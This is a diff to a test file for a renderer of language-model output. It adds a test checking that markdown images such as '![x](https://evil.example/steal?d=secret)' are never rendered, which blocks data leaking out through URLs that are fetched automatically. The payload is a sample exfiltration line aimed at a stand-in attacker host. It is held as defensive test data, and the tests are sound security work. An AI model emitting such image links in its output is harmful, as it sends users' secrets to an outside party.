@@ -25,6 +25,11 @@ test('IRON RULE 5: raw HTML in model output is never rendered as elements', () =
   expect((window as { pwned?: number }).pwned).toBeUndefined();
 });
 
+test('IRON RULE 5: markdown images are never rendered (blocks exfiltration via auto-fetched remote URLs)', () => {
+  renderMd('![x](https://evil.example/steal?d=secret)');
+  expect(document.querySelector('img')).toBeNull();
+});
+
 test('renders [n] as clickable citation chips', async () => {
   const { default: userEvent } = await import('@testing-library/user-event');
   const onClick = renderMd('Answer text [1] more.');
